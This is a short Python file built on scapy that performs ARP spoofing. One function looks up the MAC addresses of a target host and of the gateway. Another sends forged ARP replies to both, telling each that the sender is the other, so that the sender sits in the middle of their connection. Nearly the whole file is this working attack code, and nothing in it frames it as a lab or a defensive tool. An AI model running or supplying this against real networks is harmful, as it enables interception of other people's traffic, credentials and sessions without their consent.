import scapy.all as scapy

def send_spoof_packets(target_ip, gateway_ip):
    """
    Sends spoofed ARP packets to both the target and the gateway
    to sit in the middle of the connection.
    """
    # Get MAC addresses
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        return False

    # Packet to target: "I am the gateway"
    target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # Packet to gateway: "I am the target"
    gateway_packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    scapy.send(target_packet, verbose=False)
    scapy.send(gateway_packet, verbose=False)
    return True

def get_mac(ip):
    """Helper to get MAC address for a specific IP."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    ans = scapy.srp(broadcast/arp_request, timeout=2, verbose=False)[0]
    if ans:
        return ans[0][1].hwsrc
    return None